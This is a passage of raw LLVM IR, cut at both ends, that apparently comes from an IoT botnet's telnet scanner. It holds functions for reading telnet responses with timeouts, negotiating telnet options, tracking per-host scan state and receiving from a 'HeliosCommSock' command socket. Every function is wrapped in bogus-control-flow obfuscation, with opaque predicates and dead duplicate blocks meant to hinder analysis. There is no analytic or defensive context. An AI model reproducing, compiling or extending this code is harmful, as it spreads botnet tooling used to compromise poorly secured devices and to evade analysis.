  %60 = or i64 %59, %53
  store i64 %60, i64* %58, align 8
  %61 = load i32, i32* %13, align 4
  %62 = add nsw i32 %61, 1
  %63 = call i32 @select(i32 %62, %struct.__sigset_t* %16, %struct.__sigset_t* null, %struct.__sigset_t* %16, %struct.timeval* %17)
  store i32 %63, i32* %20, align 4
  %64 = icmp sle i32 %63, 0
  br i1 %64, label %65, label %150

; <label>:65:                                     ; preds = %49
  %66 = load i32, i32* @x.35
  %67 = load i32, i32* @y.36
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %65
  %74 = load i32, i32* @x.35
  %75 = load i32, i32* @y.36
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %82

; <label>:82:                                     ; preds = %originalBBpart219, %originalBBpart24
  %83 = load i32, i32* %21, align 4
  %84 = icmp slt i32 %83, 10
  br i1 %84, label %85, label %149

; <label>:85:                                     ; preds = %82
  %86 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 30, i64* %86, align 8
  %87 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %87, align 8
  br label %88

; <label>:88:                                     ; preds = %85
  %89 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %16, i32 0, i32 0
  %90 = getelementptr inbounds [16 x i64], [16 x i64]* %89, i64 0, i64 0
  %91 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %90) #2, !srcloc !2
  %92 = extractvalue { i64, i64* } %91, 0
  %93 = extractvalue { i64, i64* } %91, 1
  %94 = trunc i64 %92 to i32
  store i32 %94, i32* %22, align 4
  %95 = ptrtoint i64* %93 to i64
  %96 = trunc i64 %95 to i32
  store i32 %96, i32* %23, align 4
  br label %97

; <label>:97:                                     ; preds = %88
  %98 = load i32, i32* %13, align 4
  %99 = srem i32 %98, 64
  %100 = zext i32 %99 to i64
  %101 = shl i64 1, %100
  %102 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %16, i32 0, i32 0
  %103 = load i32, i32* %13, align 4
  %104 = sdiv i32 %103, 64
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds [16 x i64], [16 x i64]* %102, i64 0, i64 %105
  %107 = load i64, i64* %106, align 8
  %108 = or i64 %107, %101
  store i64 %108, i64* %106, align 8
  %109 = load i32, i32* %13, align 4
  %110 = add nsw i32 %109, 1
  %111 = call i32 @select(i32 %110, %struct.__sigset_t* %16, %struct.__sigset_t* null, %struct.__sigset_t* %16, %struct.timeval* %17)
  store i32 %111, i32* %20, align 4
  %112 = icmp sle i32 %111, 0
  br i1 %112, label %113, label %132

; <label>:113:                                    ; preds = %97
  %114 = load i32, i32* @x.35
  %115 = load i32, i32* @y.36
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %113
  %122 = load i32, i32* %21, align 4
  %123 = add nsw i32 %122, 1
  store i32 %123, i32* %21, align 4
  %124 = load i32, i32* @x.35
  %125 = load i32, i32* @y.36
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBBpart219, label %originalBB6alteredBB

originalBBpart219:                                ; preds = %originalBB6
  br label %82

; <label>:132:                                    ; preds = %97
  %133 = load i32, i32* @x.35
  %134 = load i32, i32* @y.36
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %132
  %141 = load i32, i32* @x.35
  %142 = load i32, i32* @y.36
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %149

; <label>:149:                                    ; preds = %originalBBpart223, %82
  br label %150

; <label>:150:                                    ; preds = %149, %49
  %151 = load i32, i32* @x.35
  %152 = load i32, i32* @y.36
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %150
  store i32 0, i32* %26, align 4
  %159 = load i8*, i8** %14, align 8
  store i8* %159, i8** %25, align 8
  %160 = load i32, i32* @x.35
  %161 = load i32, i32* @y.36
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %168

; <label>:168:                                    ; preds = %originalBBpart250, %originalBBpart227
  %169 = load i32, i32* %15, align 4
  %170 = add nsw i32 %169, -1
  store i32 %170, i32* %15, align 4
  %171 = icmp sgt i32 %169, 1
  br i1 %171, label %172, label %237

; <label>:172:                                    ; preds = %168
  %173 = load i32, i32* @HeliosCommSock, align 4
  %174 = call i64 @recv(i32 %173, i8* %24, i64 1, i32 0)
  %175 = icmp ne i64 %174, 1
  br i1 %175, label %176, label %178

; <label>:176:                                    ; preds = %172
  %177 = load i8*, i8** %25, align 8
  store i8 0, i8* %177, align 1
  store i32 -1, i32* %12, align 4
  br label %240

; <label>:178:                                    ; preds = %172
  %179 = load i32, i32* @x.35
  %180 = load i32, i32* @y.36
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %178
  %187 = load i8, i8* %24, align 1
  %188 = load i8*, i8** %25, align 8
  %189 = getelementptr inbounds i8, i8* %188, i32 1
  store i8* %189, i8** %25, align 8
  store i8 %187, i8* %188, align 1
  %190 = load i8, i8* %24, align 1
  %191 = zext i8 %190 to i32
  %192 = icmp eq i32 %191, 10
  %193 = load i32, i32* @x.35
  %194 = load i32, i32* @y.36
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %192, label %201, label %218

; <label>:201:                                    ; preds = %originalBBpart231
  %202 = load i32, i32* @x.35
  %203 = load i32, i32* @y.36
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %201
  %210 = load i32, i32* @x.35
  %211 = load i32, i32* @y.36
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %237

; <label>:218:                                    ; preds = %originalBBpart231
  %219 = load i32, i32* @x.35
  %220 = load i32, i32* @y.36
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %218
  %227 = load i32, i32* %26, align 4
  %228 = add nsw i32 %227, 1
  store i32 %228, i32* %26, align 4
  %229 = load i32, i32* @x.35
  %230 = load i32, i32* @y.36
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBBpart250, label %originalBB37alteredBB

originalBBpart250:                                ; preds = %originalBB37
  br label %168

; <label>:237:                                    ; preds = %originalBBpart235, %168
  %238 = load i8*, i8** %25, align 8
  store i8 0, i8* %238, align 1
  %239 = load i32, i32* %26, align 4
  store i32 %239, i32* %12, align 4
  br label %240

; <label>:240:                                    ; preds = %237, %176
  %241 = load i32, i32* %12, align 4
  ret i32 %241

originalBBalteredBB:                              ; preds = %originalBB, %3
  %242 = alloca i32, align 4
  %243 = alloca i32, align 4
  %244 = alloca i8*, align 8
  %245 = alloca i32, align 4
  %246 = alloca %struct.__sigset_t, align 8
  %247 = alloca %struct.timeval, align 8
  %248 = alloca i32, align 4
  %249 = alloca i32, align 4
  %250 = alloca i32, align 4
  %251 = alloca i32, align 4
  %252 = alloca i32, align 4
  %253 = alloca i32, align 4
  %254 = alloca i8, align 1
  %255 = alloca i8*, align 8
  %256 = alloca i32, align 4
  store i32 %0, i32* %243, align 4
  store i8* %1, i8** %244, align 8
  store i32 %2, i32* %245, align 4
  %257 = load i8*, i8** %244, align 8
  %258 = load i32, i32* %245, align 4
  %259 = sext i32 %258 to i64
  call void @llvm.memset.p0i8.i64(i8* %257, i8 0, i64 %259, i32 1, i1 false)
  %260 = getelementptr inbounds %struct.timeval, %struct.timeval* %247, i32 0, i32 0
  store i64 30, i64* %260, align 8
  %261 = getelementptr inbounds %struct.timeval, %struct.timeval* %247, i32 0, i32 1
  store i64 0, i64* %261, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %65
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %113
  %262 = load i32, i32* %21, align 4
  %_ = sub i32 %262, 1
  %gen = mul i32 %_, 1
  %_7 = sub i32 %262, 1
  %gen8 = mul i32 %_7, 1
  %_9 = sub i32 0, %262
  %gen10 = add i32 %_9, 1
  %_11 = sub i32 %262, 1
  %gen12 = mul i32 %_11, 1
  %_13 = shl i32 %262, 1
  %_14 = sub i32 0, %262
  %gen15 = add i32 %_14, 1
  %_16 = shl i32 %262, 1
  %_17 = shl i32 %262, 1
  %263 = add nsw i32 %262, 1
  store i32 %263, i32* %21, align 4
  br label %originalBB6

originalBB21alteredBB:                            ; preds = %originalBB21, %132
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %150
  store i32 0, i32* %26, align 4
  %264 = load i8*, i8** %14, align 8
  store i8* %264, i8** %25, align 8
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %178
  %265 = load i8, i8* %24, align 1
  %266 = load i8*, i8** %25, align 8
  %267 = getelementptr inbounds i8, i8* %266, i32 1
  store i8* %267, i8** %25, align 8
  store i8 %265, i8* %266, align 1
  %268 = load i8, i8* %24, align 1
  %269 = zext i8 %268 to i32
  %270 = icmp eq i32 %269, 10
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %201
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %218
  %271 = load i32, i32* %26, align 4
  %_38 = sub i32 %271, 1
  %gen39 = mul i32 %_38, 1
  %_40 = sub i32 %271, 1
  %gen41 = mul i32 %_40, 1
  %_42 = shl i32 %271, 1
  %_43 = sub i32 %271, 1
  %gen44 = mul i32 %_43, 1
  %_45 = sub i32 %271, 1
  %gen46 = mul i32 %_45, 1
  %_47 = sub i32 0, %271
  %gen48 = add i32 %_47, 1
  %272 = add nsw i32 %271, 1
  store i32 %272, i32* %26, align 4
  br label %originalBB37
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #2
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = load i32, i32* @x.39
  %7 = load i32, i32* @y.40
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i8**, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i32 %0, i32* %15, align 4
  store i32 %1, i32* %16, align 4
  store i8* %2, i8** %17, align 8
  store i32 %3, i32* %18, align 4
  store i8** %4, i8*** %19, align 8
  %22 = load i8*, i8** %17, align 8
  %23 = load i32, i32* %18, align 4
  %24 = sext i32 %23 to i64
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 %24, i32 1, i1 false)
  %25 = load i32, i32* %15, align 4
  %26 = load i32, i32* %16, align 4
  %27 = load i8*, i8** %17, align 8
  %28 = load i32, i32* %18, align 4
  %29 = call i32 @read_with_timeout(i32 %25, i32 %26, i8* %27, i32 %28)
  store i32 %29, i32* %20, align 4
  %30 = load i8*, i8** %17, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 0
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %33, 255
  %35 = load i32, i32* @x.39
  %36 = load i32, i32* @y.40
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %34, label %43, label %47

; <label>:43:                                     ; preds = %originalBBpart2
  %44 = load i32, i32* %15, align 4
  %45 = load i8*, i8** %17, align 8
  %46 = call i32 @negotiate(i32 %44, i8* %45, i32 3)
  br label %47

; <label>:47:                                     ; preds = %43, %originalBBpart2
  %48 = load i8*, i8** %17, align 8
  %49 = load i8**, i8*** %19, align 8
  %50 = call i32 @contains_string(i8* %48, i8** %49)
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %47
  store i32 1, i32* %14, align 4
  br label %54

; <label>:53:                                     ; preds = %47
  store i32 0, i32* %14, align 4
  br label %54

; <label>:54:                                     ; preds = %53, %52
  %55 = load i32, i32* @x.39
  %56 = load i32, i32* @y.40
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %54
  %63 = load i32, i32* %14, align 4
  %64 = load i32, i32* @x.39
  %65 = load i32, i32* @y.40
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %63

originalBBalteredBB:                              ; preds = %originalBB, %5
  %72 = alloca i32, align 4
  %73 = alloca i32, align 4
  %74 = alloca i32, align 4
  %75 = alloca i8*, align 8
  %76 = alloca i32, align 4
  %77 = alloca i8**, align 8
  %78 = alloca i32, align 4
  %79 = alloca i32, align 4
  store i32 %0, i32* %73, align 4
  store i32 %1, i32* %74, align 4
  store i8* %2, i8** %75, align 8
  store i32 %3, i32* %76, align 4
  store i8** %4, i8*** %77, align 8
  %80 = load i8*, i8** %75, align 8
  %81 = load i32, i32* %76, align 4
  %82 = sext i32 %81 to i64
  call void @llvm.memset.p0i8.i64(i8* %80, i8 0, i64 %82, i32 1, i1 false)
  %83 = load i32, i32* %73, align 4
  %84 = load i32, i32* %74, align 4
  %85 = load i8*, i8** %75, align 8
  %86 = load i32, i32* %76, align 4
  %87 = call i32 @read_with_timeout(i32 %83, i32 %84, i8* %85, i32 %86)
  store i32 %87, i32* %78, align 4
  %88 = load i8*, i8** %75, align 8
  %89 = getelementptr inbounds i8, i8* %88, i64 0
  %90 = load i8, i8* %89, align 1
  %91 = sext i8 %90 to i32
  %92 = icmp eq i32 %91, 255
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %54
  %93 = load i32, i32* %14, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = load i32, i32* @x.41
  %6 = load i32, i32* @y.42
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca %struct.__sigset_t, align 8
  %19 = alloca %struct.timeval, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i32 %0, i32* %14, align 4
  store i32 %1, i32* %15, align 4
  store i8* %2, i8** %16, align 8
  store i32 %3, i32* %17, align 4
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %19, i32 0, i32 0
  store i64 0, i64* %22, align 8
  %23 = load i32, i32* %15, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds %struct.timeval, %struct.timeval* %19, i32 0, i32 1
  store i64 %24, i64* %25, align 8
  %26 = load i32, i32* @x.41
  %27 = load i32, i32* @y.42
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %originalBBpart2
  %35 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %18, i32 0, i32 0
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %35, i64 0, i64 0
  %37 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %36) #2, !srcloc !3
  %38 = extractvalue { i64, i64* } %37, 0
  %39 = extractvalue { i64, i64* } %37, 1
  %40 = trunc i64 %38 to i32
  store i32 %40, i32* %20, align 4
  %41 = ptrtoint i64* %39 to i64
  %42 = trunc i64 %41 to i32
  store i32 %42, i32* %21, align 4
  br label %43

; <label>:43:                                     ; preds = %34
  %44 = load i32, i32* %14, align 4
  %45 = srem i32 %44, 64
  %46 = zext i32 %45 to i64
  %47 = shl i64 1, %46
  %48 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %18, i32 0, i32 0
  %49 = load i32, i32* %14, align 4
  %50 = sdiv i32 %49, 64
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [16 x i64], [16 x i64]* %48, i64 0, i64 %51
  %53 = load i64, i64* %52, align 8
  %54 = or i64 %53, %47
  store i64 %54, i64* %52, align 8
  %55 = load i32, i32* %14, align 4
  %56 = add nsw i32 %55, 1
  %57 = call i32 @select(i32 %56, %struct.__sigset_t* %18, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %19)
  %58 = icmp slt i32 %57, 1
  br i1 %58, label %59, label %76

; <label>:59:                                     ; preds = %43
  %60 = load i32, i32* @x.41
  %61 = load i32, i32* @y.42
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %59
  store i32 0, i32* %13, align 4
  %68 = load i32, i32* @x.41
  %69 = load i32, i32* @y.42
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %83

; <label>:76:                                     ; preds = %43
  %77 = load i32, i32* %14, align 4
  %78 = load i8*, i8** %16, align 8
  %79 = load i32, i32* %17, align 4
  %80 = sext i32 %79 to i64
  %81 = call i64 @recv(i32 %77, i8* %78, i64 %80, i32 0)
  %82 = trunc i64 %81 to i32
  store i32 %82, i32* %13, align 4
  br label %83

; <label>:83:                                     ; preds = %76, %originalBBpart24
  %84 = load i32, i32* %13, align 4
  ret i32 %84

originalBBalteredBB:                              ; preds = %originalBB, %4
  %85 = alloca i32, align 4
  %86 = alloca i32, align 4
  %87 = alloca i32, align 4
  %88 = alloca i8*, align 8
  %89 = alloca i32, align 4
  %90 = alloca %struct.__sigset_t, align 8
  %91 = alloca %struct.timeval, align 8
  %92 = alloca i32, align 4
  %93 = alloca i32, align 4
  store i32 %0, i32* %86, align 4
  store i32 %1, i32* %87, align 4
  store i8* %2, i8** %88, align 8
  store i32 %3, i32* %89, align 4
  %94 = getelementptr inbounds %struct.timeval, %struct.timeval* %91, i32 0, i32 0
  store i64 0, i64* %94, align 8
  %95 = load i32, i32* %87, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.timeval, %struct.timeval* %91, i32 0, i32 1
  store i64 %96, i64* %97, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %59
  store i32 0, i32* %13, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %109 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %127

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %86

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %69

; <label>:30:                                     ; preds = %23
  %31 = load i32, i32* @x.43
  %32 = load i32, i32* @y.44
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %30
  %39 = load i8*, i8** %6, align 8
  %40 = getelementptr inbounds i8, i8* %39, i64 1
  %41 = load i8, i8* %40, align 1
  %42 = zext i8 %41 to i32
  %43 = icmp eq i32 3, %42
  %44 = load i32, i32* @x.43
  %45 = load i32, i32* @y.44
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %43, label %52, label %60

; <label>:52:                                     ; preds = %originalBBpart2
  %53 = load i8*, i8** %6, align 8
  %54 = getelementptr inbounds i8, i8* %53, i64 1
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp eq i32 %56, 253
  %58 = select i1 %57, i32 251, i32 253
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %8, align 1
  br label %68

; <label>:60:                                     ; preds = %originalBBpart2
  %61 = load i8*, i8** %6, align 8
  %62 = getelementptr inbounds i8, i8* %61, i64 1
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 253
  %66 = select i1 %65, i32 252, i32 254
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %8, align 1
  br label %68

; <label>:68:                                     ; preds = %60, %52
  br label %69

; <label>:69:                                     ; preds = %68, %29
  %70 = load i32, i32* @x.43
  %71 = load i32, i32* @y.44
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %69
  %78 = load i32, i32* @x.43
  %79 = load i32, i32* @y.44
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %86

; <label>:86:                                     ; preds = %originalBBpart24, %22
  %87 = load i32, i32* @x.43
  %88 = load i32, i32* @y.44
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %86
  %95 = load i32, i32* %5, align 4
  %96 = call i64 @send(i32 %95, i8* %8, i64 1, i32 16384)
  %97 = load i32, i32* %5, align 4
  %98 = load i8*, i8** %6, align 8
  %99 = getelementptr inbounds i8, i8* %98, i64 2
  %100 = call i64 @send(i32 %97, i8* %99, i64 1, i32 16384)
  %101 = load i32, i32* @x.43
  %102 = load i32, i32* @y.44
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %126

; <label>:109:                                    ; preds = %3
  %110 = load i32, i32* @x.43
  %111 = load i32, i32* @y.44
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB10, label %originalBB10alteredBB

